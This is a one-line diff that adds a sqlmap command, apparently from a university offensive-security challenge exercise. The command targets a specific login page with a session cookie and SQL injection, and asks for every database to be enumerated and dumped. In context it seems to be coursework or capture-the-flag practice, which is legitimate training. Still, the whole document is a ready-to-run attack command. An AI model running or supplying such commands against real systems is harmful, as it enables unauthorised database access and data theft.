@@ -1,0 +1,1 @@
+python sqlmap.py --cookie="CHALBROKER_USER_ID=tg1799" -u "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php" --data="email=asd&password=asd" --dbs --dump
